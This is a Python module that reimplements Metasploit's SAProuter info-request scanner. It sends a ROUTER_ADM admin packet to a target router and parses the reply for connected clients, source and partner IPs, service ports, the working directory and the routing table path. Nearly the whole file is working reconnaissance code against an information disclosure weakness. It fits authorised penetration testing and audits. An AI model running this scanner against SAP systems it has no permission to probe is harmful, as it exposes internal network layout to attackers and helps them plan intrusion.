"""
sap_router_info.py – SAProuter admin info request (CVE-equivalent to
Metasploit's auxiliary/scanner/sap/sap_router_info_request).

Sends a ROUTER_ADM info request to an SAProuter and parses the response
to extract connected clients, working directory, routing table path,
and other configuration details.

This is an information disclosure vulnerability: a properly secured
SAProuter should reject admin requests from external hosts.

Reference: https://github.com/rapid7/metasploit-framework/blob/master/
           modules/auxiliary/scanner/sap/sap_router_info_request.rb
"""

import re
import socket
import struct


def saprouter_info_request(host: str, port: int = 3299,
                           timeout: float = 10) -> dict:
    """Send a ROUTER_ADM info request to an SAProuter.

    Args:
        host: SAProuter IP or hostname
        port: SAProuter port (default 3299)
        timeout: Connection timeout

    Returns dict with:
        vulnerable:    bool — True if info was returned
        clients:       list of dicts — connected client entries, each with:
                         id:           int    connection ID (as shown by saprouter -l)
                         source:       str    source hostname or IP
                         ip:           str    source IP (dotted-decimal)
                         partner:      str    destination IP/hostname, or "(no partner)"
                         partner_ip:   str    destination IP if available, else ""
                         service:      str    destination port, or ""
        total_clients: int — total number of connected clients
        working_dir:   str — SAProuter working directory
        routtab:       str — path to routing table file
        raw_info:      list of str — all text info lines from the response
        error:         str — error message if request failed
    """
    result = {
        "vulnerable": False,
        "clients": [],
        "total_clients": 0,
        "working_dir": "",
        "routtab": "",
        "raw_info": [],
        "error": "",
    }

    # Build ROUTER_ADM info request
    # Format: "ROUTER_ADM" + [0, version=0x26, cmd=2, 0, 0]
    admin_pkt = b"ROUTER_ADM" + struct.pack("bbbbb", 0, 0x26, 2, 0, 0)
    ni_packet = struct.pack("!I", len(admin_pkt)) + admin_pkt

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        sock.sendall(ni_packet)

        # Read all response frames
        resp = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
                if len(resp) > 100000:
                    break
        except socket.timeout:
            pass
        sock.close()

    except Exception as e:
        result["error"] = str(e)
        return result

    if len(resp) < 4:
        result["error"] = "No response from SAProuter"
        return result

    # Parse multi-frame NI response
    frames = []
    pos = 0
    while pos + 4 <= len(resp):
        flen = struct.unpack("!I", resp[pos:pos + 4])[0]
        if flen == 0:
            pos += 4
            break  # empty frame = end of response
        if pos + 4 + flen > len(resp):
            break
        payload = resp[pos + 4:pos + 4 + flen]
        frames.append(payload)
        pos += 4 + flen

    if not frames:
        result["error"] = "Empty response — admin request denied"
        return result

    # Check for error response
    if frames[0].startswith(b"NI_RTERR") or b"*ERR*" in frames[0]:
        result["error"] = "Admin request denied by SAProuter"
        return result

    # SAProuter responded with info — it's vulnerable
    result["vulnerable"] = True

    # ---------------------------------------------------------------------------
    # Frame 0: binary connection table
    #
    # Header layout (9 bytes):
    #   bytes 0-7: flags/padding
    #   byte  8:   number of client entries
    #
    # Per-entry layout (pysap SAPRouterInfoClient / saprouter -l equivalent):
    #   [4 bytes LE uint32] connection ID  (shown as "ID" in saprouter -l)
    #   [4 bytes binary]    source IP      (the "CLIENT" IP address)
    #   [null-term string]  partner        (destination address, "" if no partner)
    #   [null-term string]  service        (destination port, "" if no partner)
    #   [null-term string]  host           (source hostname, "" if not resolved)
    #
    # Note: "partner" and "host" are text strings (IP or hostname), NOT binary.
    # "partner" is empty when there is no destination yet (connection in progress).
    # ---------------------------------------------------------------------------
    conn_frame = frames[0]
    if len(conn_frame) > 9:
        num_clients_bin = conn_frame[8]
        conn_data = conn_frame[9:]
        result["clients"] = _parse_conn_table(conn_data, num_clients_bin)

    # ---------------------------------------------------------------------------
    # Frames 1+: null-terminated text info lines
    # Each frame carries one text string (working dir, routtab, client count, etc.)
    # ---------------------------------------------------------------------------
    for frame in frames[1:]:
        text = frame.decode("ascii", errors="replace").rstrip("\x00").strip()
        if not text:
            continue

        # Strip leading non-printable bytes (some kernels prepend a byte)
        while text and (ord(text[0]) < 32 or ord(text[0]) > 126):
            text = text[1:]

        if not text:
            continue

        result["raw_info"].append(text)

        if text.startswith("Total no. of clients:"):
            try:
                result["total_clients"] = int(text.split(":")[1].strip())
            except (ValueError, IndexError):
                pass
        elif "Working directory" in text and ":" in text:
            result["working_dir"] = text.split(":", 1)[1].strip()
        elif "Routtab" in text and ":" in text:
            result["routtab"] = text.split(":", 1)[1].strip()

    # ---------------------------------------------------------------------------
    # Text-pattern fallback: some router versions embed the connection table
    # as formatted text (the "saprouter -l" output) inside the text frames.
    # If the binary parser produced fewer entries than total_clients, supplement
    # from the text frames.
    # ---------------------------------------------------------------------------
    if result["total_clients"] > len(result["clients"]):
        text_clients = _parse_conn_table_text(result["raw_info"])
        if len(text_clients) > len(result["clients"]):
            result["clients"] = text_clients

    # Use total_clients from binary if text frame didn't give us one
    if result["total_clients"] == 0 and result["clients"]:
        result["total_clients"] = len(result["clients"])

    return result


# ---------------------------------------------------------------------------
# Binary connection table parser
# ---------------------------------------------------------------------------

def _parse_conn_table(conn_data: bytes, num_clients: int) -> list:
    """Parse the binary connection table from Frame 0 of the info response.

    Each entry (pysap SAPRouterInfoClient format):
        [4 LE uint32]  connection ID
        [4 bytes]      source IP (binary IPv4)
        [null-term]    partner (destination address string, "" = no partner)
        [null-term]    service (destination port string, "" = no partner)
        [null-term]    host    (source hostname string, "" = unresolved)

    Returns list of client dicts.
    """
    clients = []
    i = 0
    max_entries = max(num_clients, 64)  # safety cap — don't loop forever

    while i < len(conn_data) and len(clients) < max_entries:
        # Need at least 8 bytes for ID + source IP
        if i + 8 > len(conn_data):
            break

        # Read connection ID (4-byte little-endian unsigned int)
        conn_id = struct.unpack_from("<I", conn_data, i)[0]
        i += 4

        # Sanity check: ID should be a small-ish positive integer (< 65536)
        # If it's huge, the format might be different — stop trying
        if conn_id > 0xFFFF:
            break

        # Read source IP (4-byte binary)
        src_ip = ".".join(str(b) for b in conn_data[i:i + 4])
        i += 4

        # Read null-terminated partner string (destination address)
        partner, i = _read_null_str(conn_data, i)
        if i < 0:
            break

        # Read null-terminated service string (destination port)
        service, i = _read_null_str(conn_data, i)
        if i < 0:
            break

        # Read null-terminated source hostname string
        host, i = _read_null_str(conn_data, i)
        if i < 0:
            # Last entry — no trailing null; use what we have
            i = len(conn_data)

        # Resolve display names
        client_display = host if host else src_ip
        partner_display = partner if partner else "(no partner)"

        # Extract partner IP (the partner field IS the IP as a string in this format)
        partner_ip = partner if _looks_like_ip(partner) else ""

        clients.append({
            "id":         conn_id,
            "source":     client_display,
            "ip":         src_ip,
            "partner":    partner_display,
            "partner_ip": partner_ip,
            "service":    service,
        })

    return clients


def _read_null_str(data: bytes, offset: int) -> tuple:
    """Read a null-terminated ASCII string from *data* starting at *offset*.

    Returns (string, new_offset) where new_offset points past the null.
    Returns ("", -1) if no null terminator is found within the data.
    """
    end = data.find(b"\x00", offset)
    if end < 0:
        return "", -1
    text = data[offset:end].decode("ascii", errors="replace").strip()
    return text, end + 1


def _looks_like_ip(s: str) -> bool:
    """Return True if *s* looks like a dotted-decimal IPv4 address."""
    parts = s.split(".")
    if len(parts) != 4:
        return False
    try:
        return all(0 <= int(p) <= 255 for p in parts)
    except ValueError:
        return False


# ---------------------------------------------------------------------------
# Text-pattern fallback parser
# ---------------------------------------------------------------------------

# Matches lines from "saprouter -l" output embedded in text frames:
#   188 localhost                     | (no partner)
#   208 198.51.100.115         | 192.168.2.209                  3200
_CONN_TABLE_RE = re.compile(
    r"^\s*(\d+)\s+(\S+)\s*\|\s*(.*?)\s*(\d{2,5})?\s*$"
)


def _parse_conn_table_text(raw_info: list) -> list:
    """Parse connection table entries from text-format info lines.

    Some SAProuter versions (or certain kernel releases) include the
    connection table as formatted text (identical to saprouter -l output)
    inside the text frames.  This is a fallback to the binary parser.
    """
    clients = []
    for line in raw_info:
        m = _CONN_TABLE_RE.match(line)
        if not m:
            continue
        conn_id_str, client, partner_raw, service = m.groups()
        partner_raw = (partner_raw or "").strip()
        service = (service or "").strip()

        # Separate partner IP from trailing noise; "(no partner)" is the SAP text
        partner_display = partner_raw if partner_raw else "(no partner)"
        partner_ip = partner_raw if _looks_like_ip(partner_raw) else ""

        try:
            conn_id = int(conn_id_str)
        except ValueError:
            conn_id = 0

        clients.append({
            "id":         conn_id,
            "source":     client,
            "ip":         client if _looks_like_ip(client) else "",
            "partner":    partner_display,
            "partner_ip": partner_ip,
            "service":    service,
        })
    return clients
